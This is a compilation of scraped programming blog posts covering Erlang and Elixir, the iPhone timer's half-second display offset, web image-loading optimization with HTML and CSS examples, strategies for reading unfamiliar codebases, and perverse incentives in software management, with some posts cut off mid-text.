<li><strong>Binary manipulation.</strong> Historically, Erlang has had to support rapid implementation of binary protocols for telecom purposes. Hence, it has features that make binary manipulation much more comfortable, such as pattern matching on binaries. You can, for example, use Erlang as <a href="https://doma.dev/#an-extra-bit-for-every-byte-ctf"><code>sed</code> for binaries</a>.</li>
<li><strong>Other distributed, high-performance services.</strong> If you need to process transactions coming from a ton of places in your fintech project or create a bidding/user matching platform, Erlang is not the worst choice either.</li>
</ul><p>You can check out some of the frequent use cases of Erlang in <a href="https://serokell.io/blog/elixir-companies">our list of Elixir and Erlang companies</a>.</p><h3 id="this-looks-complicated.-can-i-build-a-web-app-in-erlang%3F">This looks complicated. Can I build a web app in Erlang?</h3><p>Yes. Overall, Erlang is well-suited for creating fast and scalable web apps. If you get there, it is quite rewarding. There are some caveats, though.</p><p>At the core of your web app (and any other app that works with HTTP) will be <a href="https://github.com/ninenines/cowboy">Cowboy</a>, but further than that, you need to know what a web app consists of and pick your tools for each layer separately.</p><p>Libraries are well documented, but novice-level introductory material is relatively sparse, and you won’t find tutorials for everything. It’s not JavaScript.</p><p>All in all, if you do decide to build web apps, using <a href="https://serokell.io/blog/introduction-to-erlang#erlang-vs.-elixir">Elixir</a>, a language built on top of Erlang, might be a better choice.</p><h2 id="why-should-you-use-erlang-in-your-project%3F">Why should you use Erlang in your project?</h2><p>Erlang has three significant advantages over other programming languages, which mainly stem from the unique way the language is built.</p><ul>
<li><strong>Concurrency.</strong> BEAM, the Erlang virtual machine, uses lightweight threads of execution (called processes). These are isolated, run across all CPUs, and communicate through messages. Because of that and language’s functional nature, it is less hard to write concurrent programs in Erlang.</li>
<li><strong>Scalability.</strong> Erlang is perfectly suited to the distributed nature of modern computing and today’s multicore CPUs. Erlang processes allow us to easily scale systems, both by adding more machines and by adding more cores to existing machines.</li>
<li><strong>Reliability.</strong> Erlang has a motto – <a href="https://verraes.net/2014/12/erlang-let-it-crash/">“let it crash”</a>. Because of the unique approach to fault-tolerance, lightweight processes can be quickly restarted by the supervisor system, which helps you build self-healing systems. While this may not seem reliable, it deals with most bugs that are not due to severe implementation errors.</li>
</ul><h2 id="let-it-crash">Let it crash</h2><p>In this section, I’ll try to bring insight into how an Erlang app is structured and how the “let it crash” philosophy works out in real life.</p><p>In all actuality, letting it crash is not about crashing for the user or the system. That is something Erlang tries very hard to avoid. Rather, it is about containing failure when it inescapably happens, since in life, things do sometimes fail. Shit happens. Let’s see how Erlang cleans it up.</p><p>Basically, an Erlang app is a tree of processes.</p><p><img src="https://serokell.io/files/7z/7zr4ovpa.3_(30)_(1).jpg" alt="Erlang app" loading="lazy"></p><p>At the bottom leaves of the tree, we have worker processes – the ones doing most of the work. Up from them, we have supervisors, which launch the workers and check up on them.</p><p>Supervisors themselves can be supervised; we can easily add a Grand Supervisor on top of the tree here.</p><p><img src="https://serokell.io/files/dt/dtuuj6hz.4_(24)_(1).jpg" alt="Erlang supervision tree" loading="lazy"></p><p>In case a process crashes, it sends a message to its supervisor. Depending on the supervision strategy set, either just the process is restarted or all of the processes underneath its supervisor are.</p><p>If restarting the connected workers doesn’t solve the problem a given amount of times in a period, the supervisor will terminate all its children and then itself. At that point, the responsibility to try to handle the problem is pushed upwards to the next supervision layer.</p><p><img src="https://serokell.io/files/eo/eoil770p.5_(20)_(1).jpg" alt="handling failure" loading="lazy"></p><p>Only if the top-level supervisor fails does it not get restarted and the application crashes.</p><h2 id="erlang-vs.-elixir">Erlang vs. Elixir</h2><p>Erlang isn’t the only language that operates on BEAM; there are multiple others. The main one is Elixir.</p><h3 id="what-is-elixir%3F">What is Elixir?</h3><p><img src="https://serokell.io/files/ph/ph8n4xcr.erlang-elixir-what-the-hell-is-this-ruby-how-it-39889435.jpg" alt="Elixir Erlang meme" loading="lazy"></p><p>Elixir was created by José Valim in the early 2010s. He took Erlang and made a thin layer on top of it that had a more modern syntax that resembled Ruby.</p><p>The resulting language was an improvement over both Erlang and Ruby. It experienced a decent popularity surge in 2015-2016, when <a href="https://www.phoenixframework.org/">Phoenix</a>, its main web framework, was released.</p><p>You can read more about Elixir and Phoenix in our <a href="https://serokell.io/blog/introduction-to-elixir">introduction to Elixir</a>.</p><h3 id="advantages-of-elixir-over-erlang">Advantages of Elixir over Erlang</h3><p>Elixir doesn’t actually add a lot of new features to Erlang. Everything you can do in Elixir, you can do in Erlang as well, and it is possible to call both languages from each other. Most of Elixir’s advantages stem from the fact that it has a more modern, Ruby-like syntax, which has led to it being more popular than Erlang.</p><p>Here are Elixir’s advantages over Erlang:</p><ul>
<li><strong>Modern syntax.</strong> The syntax of Elixir is much easier to understand if you’ve already programmed in virtually any other popular programming language. It removes some amount of boilerplate code and can lead to higher developer productivity.</li>
<li><strong>Higher popularity.</strong> Elixir has been the more popular of the two for quite some time, so content regarding Elixir is more up-to-date, and there is more of it out there.</li>
<li><strong>Frameworks.</strong> If you’re into web development, Phoenix is one of the best frameworks out there, and it is definitely the most convenient one if you want to do web development <em>and</em> functional programming. Talking about frameworks, Elixir also has Nerves – an awesome framework for embedded software. If this is the route you want to take, Elixir is a better choice.</li>
</ul><h2 id="is-erlang-worth-learning%3F">Is Erlang worth learning?</h2><p>So, why should you learn this language? There are three reasons:</p><ul>
<li>You’re eyeing a position in the specific fields that Erlang is used in. E.g. you adore chat apps and you would like to work at WhatsApp. That’s reasonable.</li>
<li>You want to write really small, portable programs with as little dependencies as possible. Erlang actually enables you to do a whole lot out of the box.</li>
<li>You’re a genuinely curious human being and want to discover new ways of programming without an immediate benefit to bottom line. In that case, I welcome you to the ranks of BEAM.</li>
</ul><p>If the last is true, I would actually point your way towards Elixir. While both languages are great to use, Elixir is the one that seems to be more popular lately. It will give you more job opportunities and will be easier to learn.</p><p>Afterward, you can learn Erlang and what makes it tick. Knowing how Erlang functions underneath Elixir will help you write better Elixir code and make you more likely to get hired as an Elixir developer.</p><p>Anyway, I don’t think you will regret any part of journeying BEAM, even though it is not all sunshine and rainbows (BEAM languages can get quite weird sometimes). If you are wondering where to start, I’d guide you either to <a href="https://learnyousomeerlang.com/">Learn You Some Erlang for Great Good!</a> or our beginner’s guide on <a href="https://serokell.io/blog/learn-elixir">learning Elixir</a>.</p><p>If you would like to read more posts on BEAM languages, don’t be afraid to also follow us on <a href="https://twitter.com/serokell">Twitter</a> or <a href="https://serokell.medium.com/">Medium</a>.</p></div></div>]]>

December 28, 2020 | https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/ | <a href="https://web.archive.org/web/*/https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>While building my event timer app called <a href="https://stagetimer.io/">stagetimer.io</a> I came across a peculiarity with displaying time and found out that the iPhone timer addresses it by showing us a fake time. By definition, a countdown shows how much time is left. So if the countdown says 5s we assume there are 5 seconds left. But that’s not the whole truth.</p>

<p>The iPhone countdown timer doesn’t strictly display the correct time but adds 500ms, or half a second, to the remaining time. It does this to make the reading of time more intuitive for humans. The alarm at the end of the countdown is not affected by this 500ms inaccuracy.</p>

<p>Javascript likes to use milliseconds when dealing with time, 1000ms equals 1s. Here is an example of a 5s countdown that starts at 5000ms and uses the <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval">setInterval()</a> function to deduct 10ms every 10ms, simple enough. Milliseconds are converted to seconds by dividing by 1000 and rounding down like so: <code>Math.floor(milliseconds / 1000)</code></p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds.gif" data-still="/img/writing/5s-timer-seconds.png" alt="5s countdown timer showing only seconds">
  </figure>
</div>
<p>The timer jumps to 4s right when hitting start and once the timer switches to 0s there are still 1s to go. This makes a lot of sense when counting up, for example, 10:00 is displayed during the first minute of 10 AM, not 10:01, always rounding down. But for a countdown timer, this is counterintuitive. It is easier to understand if the timer has a fractional seconds display.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds-fractions.gif" data-still="/img/writing/5s-timer-seconds-fractions.png" alt="5s countdown timer showing seconds and its fractions">
  </figure>
</div>
<p>Now the timer displays 0.9s seconds instead of 0s to show clearly that there is still time left on the clock. However, I didn’t want to show fractional seconds for my timer.</p>

<p>Now I was curious how my iPhone solves this conundrum. So I set my iPhone timer to 5s:</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-iphone.gif" data-still="/img/writing/5s-timer-iphone.png" alt="5s countdown timer on the iPhone">
  </figure>
</div>
<p>After I click “Start” the iPhone timer shows 5s, not 4s like in the example above. But it switches to 4s before a full second expired. It then counts proper seconds until it reaches 0s which, again, is not a full second. And if you tap “Pause” just after it jumped to 0s it will promptly jump back to 1s to show you that there is, in fact, still some time left on the countdown.</p>
<p>I figured that the good folks at Apple add an extra fake 500ms to the actual time to start that countdown display at 5s instead of 4s. The timer ends and the phone beeps if the actual time hits 0s and the “fake” time hits 500ms. So they faced the same problem I did and came up with a practical solution. After all, if you start a 5s countdown, it should start at 5s right? For illustration, here is my simple timer doing the same trick.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-fake-seconds.gif" data-still="/img/writing/5s-timer-fake-seconds.png" alt="5s countdown timer showing fake seconds">
  </figure>
</div>
<p>So there you have it, the iPhone timer is technically lying a little bit to you.</p>

<p>Some have pointed out that the problem could be solved more easily by rounding to the nearest second or rounding up instead of rounding down. This is correct. Suppose we have <code>5459543ms</code> that we want to bring into the traditional form <code>HH:mm:ss</code>.</p>
<p>I first divided the number into hours, minutes, and seconds with the help of some modular arithmetic and applied the rounding afterward. Rounding down results in <code>01:30:59</code>, which is correct, but rounding to the nearest integer or rounding up results in the impossible time <code>02:31:60</code>.</p>
<pre><code>time = <span>5459543</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p>However, rounding the time to seconds first <code>5460000ms</code>, and breaking it down afterward yields the same result as described above with adding 500ms, namely <code>01:31:00</code>.</p>
<pre><code>time = <span>5460000</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p><em>Edit 2: In an earlier version I messed up my rounding as described. Many helpful, as well as helpful and insulting, comments pointed out my error. So in addition to learning about counting time I also learned how it feels to be wrong on the internet</em> 😅</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>In this post I'll outline 8 image loading optimization techniques to minimize both the bandwidth used for loading images on the web and the CPU usage for image display. I'll present them in the form of an annotated HTML example to make it easy for folks to reproduce the results. Some of these techniques are more established, while others are somewhat novel. Ideally, your favorite mechanism for publishing web documents (like a CMS, static site generator, or web application framework) implements all of these out-of-the-box. I'll keep a <a href="#tools">list updated at the end of this posts</a> with technologies that provide <em>all</em> of the optimizations outlined here.</p><p>Together the techniques optimize all elements of <a href="https://web.dev/vitals/">Google's Core Web Vitals</a> by</p><ul><li>Minimizing the <a href="https://web.dev/lcp/">Largest Contentful Paint (LCP)</a> through reducing bytes, caching, and lazy loading.</li><li>Keeping <a href="https://web.dev/cls/">Cumulative Layout Shift (CLS)</a> to zero.</li><li>Reducing <a href="https://web.dev/fid/">First Input Delay(FID)</a> through reduced (main-thread) CPU usage.</li></ul><p>View the source of this sample image to see all the techniques in action:</p><p><picture><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.avif 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.avif 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.avif 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.avif 320w" type="image/avif"><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.webp 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.webp 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.webp 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.webp 320w" type="image/webp"><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.jpg 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.jpg 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.jpg 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.jpg 320w" type="image/jpeg"><img alt="Sample image illustrating the techniques outlined in this post." height="2268" src="https://www.industrialempathy.com/img/remote/ZiClJf.jpg" width="4032" decoding="async" loading="lazy"></picture></p><h2 id="responsive-layout">Responsive layout <a href="#responsive-layout">#</a></h2><p>This is a well understood technique to make an image use the available horizontal space up until its maximum size while retaining the aspect ratio. New in 2020 is that web browsers will reserve the correct vertical space for the image before it loads if the <code>width</code> and <code>height</code> attributes are provided for the <code>img</code> element. This avoids <a href="https://web.dev/cls/">Cumulative Layout Shift (CLS)</a>.</p><pre><code><span><span><span>&lt;</span>style</span><span>&gt;</span></span><span><span><br>  <span>img</span> <span>{</span><br>    <span>max-width</span><span>:</span> 100%<span>;</span><br>    <span>height</span><span>:</span> auto<span>;</span><br>  <span>}</span><br></span></span><span><span><span>&lt;/</span>style</span><span>&gt;</span></span><br><br><span><span><span>&lt;</span>img</span> <span>height</span><span><span>=</span><span>"</span>853<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>1280<span>"</span></span> <span>…</span> <span>/&gt;</span></span></code></pre><h2 id="lazy-rendering">Lazy rendering <a href="#lazy-rendering">#</a></h2><p>The second technique is more cutting edge. The new CSS attribute <code>content-visibility: auto</code> instructs the browser to not bother layouting the image until it gets near the screen. This has all kinds of benefits, but the most important one might be that the browser will not bother decoding our blurry placeholder image or the image itself unless it has to, saving CPU. Unfortunately, this will cause CLS unless we provide the companion CSS property <code>contain-intrinsic-size</code>. And even more unfortunately, it doesn't come with the awesome inference of the aspect ratio from the <code>width</code> and <code>height</code> attributes and hence we need to provide a relatively complex value that calculates the space the browser should reserve for the image.</p><p>The formula here should work if you provide a <code>--main-width</code> CSS variable describing the width of the main section of your doc. <code>1280px</code> is the max-width of the image, <code>853px</code> the max-height, and <code>0.66640625</code> the aspect-ratio. Yaihh, simple web 😛</p><pre><code><span><span><span>&lt;</span>style</span><span>&gt;</span></span><span><span><br>  <br>  <span>main img</span> <span>{</span><br>    <br>    <span>content-visibility</span><span>:</span> auto<span>;</span><br>  <span>}</span><br></span></span><span><span><span>&lt;/</span>style</span><span>&gt;</span></span><br><span><span><span>&lt;</span>img</span><span><span><br>  <span>style</span></span><span>="</span><br><span>      <span>contain-intrinsic-size</span><span>:</span> </span><br><span>        <span>min</span><span>(</span></span><br><span>          <span>var</span><span>(</span>--main-width<span>)</span><span>,</span> </span><br><span>          1280px<span>)</span> </span><br><span>        <span>min</span><span>(</span></span><br><span>          <span>calc</span><span>(</span><span>var</span><span>(</span>--main-width<span>)</span> * 0.66640625<span>)</span><span>,</span> </span><br><span>          853px<span>)</span><span>;</span></span><span>"</span></span><br><span>/&gt;</span></span></code></pre><h2 id="avif">AVIF <a href="#avif">#</a></h2><p><a href="https://jakearchibald.com/2020/avif-has-landed/">AVIF</a> is the most recent image format that has gained adoption in web browsers. It is currently supported in Chromium browsers, and available behind a flag in Firefox. Safari support isn't available yet, but given that Apple is a member of the <a href="http://aomedia.org/">group</a> that is behind the format, we can expect future support.</p><p>AVIF is notable because it very consistently outperforms JPEG in a very significant way. This is different from WebP which doesn't always produce smaller images than JPEG and may actually be a net-loss due to lack of support for progressive loading.</p><p>To implement progressive enhancement for AVIF, use the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture"><code>picture</code> element</a>.</p><p>The actual <code>img</code> element is nested in the <code>picture</code>. This can be quite confusing, because the <code>img</code> is sometimes described as fallback for browsers without picture support but basically the <code>picture</code> element only helps with <code>src</code> selection but has no layout itself. The element that is drawn (and which you style) is the <code>img</code> element.</p><p>Until very recently it was relatively difficult to actually encode AVIF images on the server-side, but with the latest version of libraries like <a href="https://github.com/lovell/sharp">sharp</a> it is now trivial.</p><pre><code><span><span><span>&lt;</span>picture</span><span>&gt;</span></span><br>  <span><span><span>&lt;</span>source</span><br>    <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>    <span>srcset</span><span><span>=</span><span>"</span><br>      /img/Z1s3TKV-1920w.avif 1920w,<br>      /img/Z1s3TKV-1280w.avif 1280w,<br>      /img/Z1s3TKV-640w.avif   640w,<br>      /img/Z1s3TKV-320w.avif   320w<br>    <span>"</span></span><br>    <span>type</span><span><span>=</span><span>"</span>image/avif<span>"</span></span><br>  <span>/&gt;</span></span><br>  <br>  <span><span><span>&lt;</span>img</span> <span>/&gt;</span></span><br><span><span><span>&lt;/</span>picture</span><span>&gt;</span></span></code></pre><h2 id="load-the-right-number-of-pixels">Load the right number of pixels <a href="#load-the-right-number-of-pixels">#</a></h2><p>You might have noticed the <code>srcset</code> and <code>sizes</code> attributes in the snippet above. Using the <code>w</code> selector it tells the browser which URL to use based on the physical pixels that would be used if the image was drawn to the user's device given the width calculated from the <code>sizes</code> attribute (which is a media query expression).</p><p>With this the browser will always download the smallest possible image that provides the best image quality for the user. Or it may select a smaller image if, for example, the user has opted into some kind of data-saving mode.</p><h3 id="fallbacks">Fallbacks <a href="#fallbacks">#</a></h3><p>Provide more source elements with <code>srcset</code>s for browsers that only support legacy image formats.</p><pre><code><span><span><span>&lt;</span>source</span><br>  <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>  <span>srcset</span><span><span>=</span><span>"</span><br>    /img/Z1s3TKV-1920w.webp 1920w,<br>    /img/Z1s3TKV-1280w.webp 1280w,<br>    /img/Z1s3TKV-640w.webp   640w,<br>    /img/Z1s3TKV-320w.webp   320w<br>  <span>"</span></span><br>  <span>type</span><span><span>=</span><span>"</span>image/webp<span>"</span></span><br><span>/&gt;</span></span><br><span><span><span>&lt;</span>source</span><br>  <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>  <span>srcset</span><span><span>=</span><span>"</span><br>    /img/Z1s3TKV-1920w.jpg 1920w,<br>    /img/Z1s3TKV-1280w.jpg 1280w,<br>    /img/Z1s3TKV-640w.jpg   640w,<br>    /img/Z1s3TKV-320w.jpg   320w<br>  <span>"</span></span><br>  <span>type</span><span><span>=</span><span>"</span>image/jpeg<span>"</span></span><br><span>/&gt;</span></span></code></pre><h2 id="caching-%2F-immutable-urls">Caching / Immutable URLs <a href="#caching-%2F-immutable-urls">#</a></h2><p>Embed a hash of the bytes in the image in the URL of the image. In the examples above I'm doing that with the <code>Z1s3TKV</code> in the image URLs. That way the URL will change if the image changes and respectively you can apply infinite cache expiration for your images. You want your caching headers to look something like this <code>cache-control: public,max-age=31536000,immutable</code>.</p><p><code>immutable</code> is the semantically correct <code>cache-control</code> value, but unfortunately it isn't widely supported in browsers (I'm looking at you, Chrome). <code>max-age=31536000</code> is the fallback to cache for a year. <code>public</code> is important to allow your CDN to cache the image and deliver it from the edge. But only use that if it is appropriate from a privacy perspective.</p><h2 id="lazy-loading">Lazy loading <a href="#lazy-loading">#</a></h2><p>Adding <code>loading="lazy"</code> to the <code>img</code> instructs the browser to only start fetching the image as it gets closer to the screen and is likely to actually be rendered.</p><pre><code><span><span><span>&lt;</span>img</span> <span>loading</span><span><span>=</span><span>"</span>lazy<span>"</span></span> <span>…</span> <span>/&gt;</span></span></code></pre><h2 id="asynchronous-decoding">Asynchronous decoding <a href="#asynchronous-decoding">#</a></h2><p>Adding <code>decoding="async"</code> to the <code>img</code> gives the browser permission to decode the image off the main thread avoiding user impact of the CPU-time used to decode the image. This should have no discernible downside except that it cannot always be the default for legacy reasons.</p><pre><code><span><span><span>&lt;</span>img</span> <span>decoding</span><span><span>=</span><span>"</span>async<span>"</span></span> <span>…</span> <span>/&gt;</span></span></code></pre><h2 id="blurry-placeholder">Blurry placeholder <a href="#blurry-placeholder">#</a></h2><p>A blurry placeholder is an inline image that provides the user some notion of the image that will load eventually without requiring fetching bytes from the network.</p><img alt="Sample blurry placeholder" height="853" src="https://www.industrialempathy.com/img/blurry.svg" width="1280"><p>Some notes on the implementation provided here:</p><ul><li>It inlines the blurry placeholder as a <code>background-image</code> of the image. This avoids using a second HTML element and it naturally hides the placeholder when the image loads, so that no JavaScript is needed to implement this.</li><li>It wraps the data URI of the actual image in a data URI of a SVG image. That is done because the blurring of the image is done at the SVG level instead of through a CSS filter. The result is that the blurring is only performed once per image when the SVG is rasterized, instead of on every layout saving CPU.</li></ul><pre><code><span><span><span>&lt;</span>img</span><span><span><br>  <span>style</span></span><span>="</span><br><span>      …</span><br><span>      <span>background-size</span><span>:</span> cover<span>;</span></span><br><span>      <span>background-image</span><span>:</span> </span><br><span>        <span>url</span><span>(</span>'<span>data</span><span>:</span>image/svg+xml<span>;</span>charset=utf-8<span>,</span>%3Csvg xmlns=\'http%3A//www.w3.org/2000/svg\'</span><br><span>        xmlns%3Axlink=\'http%3A//www.w3.org/1999/xlink\' viewBox=\'0 0 1280 853\'%3E%3Cfilter id=\'b\' color-interpolation-filters=\'sRGB\'%3E%3CfeGaussianBlur stdDeviation=\'.5\'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type=\'discrete\' tableValues=\'1 1\'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter=\'<span><span>url</span><span>(</span>%23b<span>)</span></span>\' x=\'0\' y=\'0\' height=\'100%25\' width=\'100%25\' </span><br><span>        xlink%3Ahref=\<span>'data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAGCAIAAACepSOSAAAACXBIWXMAAC4jAAAuIwF4pT92AAAAs0lEQVQI1wGoAFf/AImSoJSer5yjs52ktp2luJuluKOpuJefsoCNowB+kKaOm66grL+krsCnsMGrt8m1u8mzt8OVoLIAhJqzjZ2tnLLLnLHJp7fNmpyjqbPCqLrRjqO7AIeUn5ultaWtt56msaSnroZyY4mBgLq7wY6TmwCRfk2Pf1uzm2WulV+xmV6rmGyQfFm3nWSBcEIAfm46jX1FkH5Djn5AmodGo49MopBLlIRBfG8yj/dfjF5frTUAAAAASUVORK5CYII=\'%3E%3C/image%3E%3C/svg%3E'</span><span>)</span><span>;</span></span><br><span>    </span><span>"</span></span><br>  <span>…</span><br><span>/&gt;</span></span></code></pre><h3 id="(optional-ish)-javascript-optimization">(Optional-ish) JavaScript optimization <a href="#(optional-ish)-javascript-optimization">#</a></h3><p>Browsers may feel obliged to rasterize the blurry placeholder even if the image is already loaded.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1609181702132/Jl1bi-T1p.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div itemprop="text"><p>A few weeks ago, a tweet made me take a second and think about something that I'd never consciously considered before; how can you approach an unfamiliar codebase and start to understand it?</p>

<p>It got me thinking about how I would approach a new repo that I'd never seen before but needed to make a contribution against, like a bug fix. I remembered my early days of learning <a target="_blank" href="https://kubernetes.io/">Kubernetes</a>, and wanting to make requests to the its API (because using the command line wasn't good enough for me, apparently). I had been trying to work out how to automatically deploy a particular branch of a GitLab repo into a cluster every time someone pushed to it. I had big ideas about automating DNS, setting up automated certificates, and adding a Slackbot to notify you whenever a new deploy happened.</p>
<p>If I remember correctly, I got a proof of concept working, and then it never went much past that. Given how popular <a target="_blank" href="https://www.cloudbees.com/gitops/what-is-gitops">GitOps</a> has become, maybe I should have stuck with it! When I started delving into the Kuberenetes side of the project, I was completely and utterly lost. The documentation didn't have much in the way of <em>how</em> to use the API (I'm sure nowadays things are much better), and reading the Kubernetes source code was a complete non-starter because well, that thing is a monster. I remember thinking to myself that I just needed to replicate what kubectl was doing to create a new Deployment.</p>
<p>So I gave up trying to read Kubernetes' source, and moved over to the <a target="_blank" href="https://github.com/kubernetes/kubectl">source for kubectl</a>. This is where I started to make some headway! I was able to follow straight from the <code>main()</code> function to the <code>apply</code> command, down through the logic until it started making API requests. It felt so good to finally get an answer, and to just import some Go packages to make it all work in short order!*</p>
<p>This is the background behind my answer to the tweet above:</p>

<p>Since that project years ago, I've sort of instinctively followed this strategy whenever I need to reason about a new codebase because well, it works! Only recently did this tweet make me think about it concretely, and I'm glad it did. I tried to replicate this purposefully to test my strategy. I went to a <a target="_blank" href="https://github.com/fluxcd/flux2">large open-source repo</a> and tried to find the code where it installed itself into a cluster. Using this strategy, I started with the tool's <code>main()</code> and then was able to find my way to the <code>install</code> command, which led me down to where the installation happens (funnily enough, by calling <code>kubectl</code>).</p>
<p>I think it's important for any developer to understand not only how to reason about an unfamiliar codebase, but also to realize that an important way that we learn is by trial and error. When we try something and it works, it brings us joy and we'll continue to do it, even if we don't realize it. I think it's a good idea to take a second to think about these moments when they happen, take a mental note of it so that next time you come across a similar problem, you can consciously use your previous learning and expand upon the strategies you've developed over time.</p>
<p>The reason I wanted to turn this tweet into a full blog post is because it made me realize that one of the goals for <a target="_blank" href="https://github.com/suborbital/atmo">Atmo</a> is to make it easier for developers to reason about applications. Since Atmo uses a declarative format for building backend applications (using WebAssembly modules), there is always one canonical entrypoint; the Directive. From there, you can easily reason about what the application is doing because it is <a target="_blank" href="https://stackoverflow.com/a/1784702">declarative instead of imperative</a>. This is one of the things that made Kubernetes so popular. Being able to describe your application in a simple format, and then have a system "make it happen" is a magical thing, and Atmo strives to do exactly that.</p>
<p>Atmo is gaining new functionality every week. If you want to learn more, check out <a target="_blank" href="https://suborbital.dev/">the Suborbital homepage</a></p>
<ul>
<li>When I say "short order", I'm sure it still took several days to get everything working, but once you unblock yourself on a big problem, everything after that just seems to fly by.</li>

<p>1902 was <a href="https://www.atlasobscura.com/articles/hanoi-rat-massacre-1902">a big year for rats</a> in Hanoi, Vietnam.</p>



<p>The city had spent the past few years building a city-wide sewer system, and toilets with running water became a symbol of progress and status. Of course, all those miles of underground sewage pipe were predator-free real estate for rats, so they multiplied.</p>



<p>When the rats got hungry, they’d follow the sewage lines to the surface. Those <a href="https://critter.blog/2020/12/07/spend-your-money-where-you-spend-your-time/">high status toilets</a> didn’t seem so desirable once rats started popping out, bringing everything from gross ickyness to bubonic plague.</p>



<p>So the government created a bounty program. Bring in the severed tail of a rat and get paid, simple as that. The Great Hanoi Rat Massacre picked up quickly, and at its peak, citizens killed over 20,000 rats in a single day. So far so good.</p>



<p>But <a href="https://critter.blog/2020/12/10/the-tragedy-of-the-commons-in-software-development/">people are greedy</a>. They started cutting the tails off and then releasing the rats back into the wild to breed. More breeding leads to more rats which leads to more tails which leads to more money. Simple economics. Some people even threw together makeshift rat breeding operations. </p>



<p>And just like that, Hanoi’s rat problem was worse than ever. </p>



<p>The rat bounty is an example of a <a href="https://en.wikipedia.org/wiki/Perverse_incentive">perverse incentive</a>. Whenever you see a reward that ends up encouraging the opposite of the behavior it was aiming for, you know you’ve got a perverse incentive on your hands.</p>



<p>The classic example in the development world is our friend <em>the velocity goal</em>. Misguided managers sometimes set a velocity goal in an effort to increase the productivity and value of the team. Usually it’s something like: “Let’s aim for 25 story points every sprint!” Or even worse, maybe it’s at an individual level: “Everyone aim for 10 story points per sprint!”</p>



<p>Of course people start “breeding rats” to game the system. They’ll over-inflate the estimates. They’ll tackle a ton of easy 1-pointer bug tickets instead of picking up the meatier work. They’ll do things <a href="https://critter.blog/2020/10/14/parkinsons-law-and-friends/">fast instead of right</a>. They’ll <a href="https://critter.blog/2020/10/05/guerrilla-productivity-tactics/">ignore their blocked coworkers</a> because they’re <a href="https://critter.blog/2020/12/10/the-tragedy-of-the-commons-in-software-development/">too focused on hitting their own goals</a>. This is not the way to increase the productivity and value of the team. A velocity goal is <a href="https://critter.blog/2020/12/22/power-in-naming-things/">a perverse incentive</a>. </p>



<p><a href="https://en.wikipedia.org/wiki/Goodhart%27s_law">Goodhart’s law</a> is one of my all time favorites. Here’s the simplified version:</p>



<blockquote><p>When a measure becomes a target, it ceases to be a good measure.</p></blockquote>



<p>Because remember, <a href="https://critter.blog/2020/11/12/velocity-doesnt-measure-value/">velocity</a> itself isn’t bad. It’s <a href="https://critter.blog/2020/08/20/plan-the-sprint-not-the-project/">useful for forecasting</a>, for example. But the second we turn the velocity measure into a target, it stops being a good measure. People game the system in an attempt to hit the target, and the value of the measure gets lost along the way.</p>



<p>Automated testing code coverage also comes to mind. As a measure, sure, it’s useful. But when a team decides something like “we need 80% code coverage” then it stops being useful. It doesn’t take long for the tail-less rats to start breeding. Then we’re left with tests that aren’t valuable but contribute to the coverage goal. </p>



<p>Those pointless tests take time to run and someone has to maintain them. So instead of making automated testing more useful, we’ve made it less useful. Perverse incentive. </p>



<p>It’s a sticky wicket, Goodhart’s law. Obviously, some things need to be targets, right? What is a company without goals? But how can we make sure we’re not creating perverse incentives? </p>



<p>The silver bullet is a ruthless adherence to <a href="https://critter.blog/2020/11/16/the-2-responsibilities-of-a-manager/">outcome-based goals</a> over output-based goals. Outcomes are what the business wants or needs to achieve. Outputs are the actions that help reach an outcome. We want goals to be based around what the business wants, not the steps we think will get us there. </p>



